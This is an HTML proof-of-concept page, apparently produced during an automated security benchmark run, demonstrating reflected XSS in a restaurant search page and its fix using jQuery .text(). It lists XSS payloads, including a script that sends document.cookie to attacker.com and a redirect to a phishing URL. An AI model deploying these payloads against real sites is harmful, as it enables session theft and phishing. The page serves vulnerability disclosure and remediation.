<!-- 
POC: HTML POC demonstrating XSS vulnerability in search results. Shows vulnerable pattern using direct string concatenation vs. safe pattern using text() method. Includes live rendering that executes malicious JavaScript to prove vulnerability.
Target: ./repo
Created: 2025-11-07T19:45:10.774Z
Session: benchmark-XBEN-069-24-mhp8x6to

To test this POC:
1. Open this file in a web browser: file:///home/daytona/.pensar/executions/benchmark-XBEN-069-24-mhp8x6to/pocs/poc_xss_search_results_v2.html
2. Or serve it and navigate to the target application
3. Observe the vulnerability demonstration (e.g., XSS alert, CSRF execution)
-->

<!DOCTYPE html>
<html>
<head>
    <title>XSS Vulnerability in Search Results - POC</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body { padding: 20px; }
        .vulnerability-box { background: #fee; border-left: 4px solid red; padding: 15px; margin: 20px 0; }
        .success-box { background: #efe; border-left: 4px solid green; padding: 15px; margin: 20px 0; }
        .code-block { background: #f5f5f5; border: 1px solid #ddd; padding: 10px; margin: 10px 0; overflow-x: auto; font-family: monospace; }
        .payload { background: #ffcccc; padding: 5px; border-radius: 3px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Reflected XSS in Search Results Display - POC</h1>
        <p class="text-muted">Demonstrates vulnerability in /index.php search results rendering</p>
        
        <hr>
        
        <h2>Vulnerability Summary</h2>
        <div class="vulnerability-box">
            <strong>Type:</strong> Reflected Cross-Site Scripting (XSS)<br>
            <strong>Location:</strong> /index.php (search results display)<br>
            <strong>Severity:</strong> MEDIUM<br>
            <strong>Root Cause:</strong> Unescaped output via direct string concatenation in JavaScript
        </div>
        
        <h2>Vulnerable Code Analysis</h2>
        <p>The application renders search results using this vulnerable pattern:</p>
        <div class="code-block">
resultsContainer.append(
    '&lt;h5 class="card-title"&gt;' + restaurant.name + '&lt;/h5&gt;' +
    '&lt;p class="card-text"&gt;' + restaurant.description + '&lt;/p&gt;' +
    '&lt;p class="card-text"&gt;...&lt;/small&gt;' + restaurant.category + '&lt;/small&gt;&lt;/p&gt;'
);
        </div>
        
        <h2>Attack Scenario</h2>
        <p>If restaurant data could contain malicious JavaScript, it would execute in the user's browser:</p>
        
        <h3>Payload 1: Image onerror handler</h3>
        <div class="code-block">
<span class="payload">Pizza World&lt;img src=x onerror="alert('XSS: Cookie='+document.cookie)"&gt;</span>
        </div>
        
        <h3>Payload 2: Script injection via description</h3>
        <div class="code-block">
<span class="payload">Great Italian food&lt;script&gt;fetch('http://attacker.com/steal?c='+btoa(document.cookie))&lt;/script&gt;</span>
        </div>
        
        <h3>Payload 3: SVG-based XSS</h3>
        <div class="code-block">
<span class="payload">Restaurant&lt;svg onload="document.location='http://attacker.com/phishing'"&gt;</span>
        </div>
        
        <hr>
        
        <h2>Live Demonstration</h2>
        <p>Below is a demonstration of the vulnerable code rendering malicious data:</p>
        
        <div class="row">
            <div class="col-md-6">
                <h3>Vulnerable Rendering (UNSAFE)</h3>
                <p class="text-danger">This uses the vulnerable pattern from index.php</p>
                <div id="vulnerable-results" style="border: 2px solid red; padding: 10px; min-height: 100px;"></div>
                <p class="small text-muted">Check browser console for XSS execution confirmation</p>
            </div>
            
            <div class="col-md-6">
                <h3>Safe Rendering (FIXED)</h3>
                <p class="text-success">This uses proper text() method</p>
                <div id="safe-results" style="border: 2px solid green; padding: 10px; min-height: 100px;"></div>
            </div>
        </div>
        
        <hr>
        
        <h2>Execution Results</h2>
        <div id="results-log" style="background: #f9f9f9; border: 1px solid #ddd; padding: 15px; margin: 10px 0; font-family: monospace; white-space: pre-wrap; font-size: 12px; max-height: 300px; overflow-y: auto;"></div>
        
        <hr>
        
        <h2>Remediation</h2>
        <p>Fix by using jQuery's <code>.text()</code> method or proper HTML escaping:</p>
        <div class="code-block">
// SAFE: Using jQuery text() method
results.forEach(function(restaurant) {
    var card = $('&lt;div&gt;').addClass('card mb-3');
    var cardBody = $('&lt;div&gt;').addClass('card-body');
    var title = $('&lt;h5&gt;').addClass('card-title').text(restaurant.name);
    cardBody.append(title);
    card.append(cardBody);
    resultsContainer.append(card);
});
        </div>
    </div>
    
    <script>
        function log(message) {
            var logDiv = document.getElementById('results-log');
            var timestamp = new Date().toLocaleTimeString();
            logDiv.textContent += '[' + timestamp + '] ' + message + '\n';
        }
        
        // Simulate restaurant data with XSS payload
        var mockRestaurants = [
            {
                name: 'Pizza Palace',
                description: 'Delicious pizza<img src=x onerror="log(\'[+] XSS EXECUTED: JavaScript executed from restaurant.description\'); window.xssDetected=true;">',
                category: 'Italian'
            },
            {
                name: 'Sushi World<img src=x onerror="log(\'[+] XSS EXECUTED: JavaScript executed from restaurant.name\'); window.xssDetected=true;">',
                description: 'Fresh sushi daily',
                category: 'Japanese'
            },
            {
                name: 'Burger House',
                description: 'Classic American burgers',
                category: 'American<script>log(\'[+] Script tag in category\')</script>'
            }
        ];
        
        log('[*] Starting XSS vulnerability demonstration...');
        log('[*] Simulating vulnerable code from /index.php');
        log('');
        
        // VULNERABLE CODE - Direct string concatenation (from index.php)
        log('[*] Rendering with VULNERABLE pattern (direct concatenation)...');
        var vulnerableResults = $('#vulnerable-results');
        vulnerableResults.empty();
        
        mockRestaurants.forEach(function(restaurant) {
            vulnerableResults.append(
                '<div class="card mb-3">' +
                    '<div class="card-body">' +
                        '<h5 class="card-title">' + restaurant.name + '</h5>' +
                        '<p class="card-text">' + restaurant.description + '</p>' +
                        '<p class="card-text"><small class="text-muted">' + restaurant.category + '</small></p>' +
                    '</div>' +
                '</div>'
            );
        });
        
        log('[+] Vulnerable code executed - check browser console for XSS confirmation');
        log('');
        
        // SAFE CODE - Using text() method
        log('[*] Rendering with SAFE pattern (using text() method)...');
        var safeResults = $('#safe-results');
        safeResults.empty();
        
        mockRestaurants.forEach(function(restaurant) {
            var card = $('<div>').addClass('card mb-3');
            var cardBody = $('<div>').addClass('card-body');
            var title = $('<h5>').addClass('card-title').text(restaurant.name);
            var desc = $('<p>').addClass('card-text').text(restaurant.description);
            var cat = $('<p>').addClass('card-text').append(
                $('<small>').addClass('text-muted').text(restaurant.category)
            );
            cardBody.append(title, desc, cat);
            card.append(cardBody);
            safeResults.append(card);
        });
        
        log('[+] Safe rendering complete - malicious content is displayed as text, not executed');
        log('');
        
        // Check results
        setTimeout(function() {
            if (window.xssDetected) {
                log('[+] âœ“ XSS VULNERABILITY CONFIRMED');
                log('[+] JavaScript code from restaurant data was executed');
                log('[+] This confirms the XSS vulnerability in search results rendering');
                log('');
                log('[CRITICAL] An attacker could:');
                log('  1. Inject malicious JavaScript into restaurant names');
                log('  2. Steal user session cookies');
                log('  3. Redirect users to phishing sites');
                log('  4. Perform actions on behalf of the user');
            }
        }, 100);
    </script>
</body>
</html>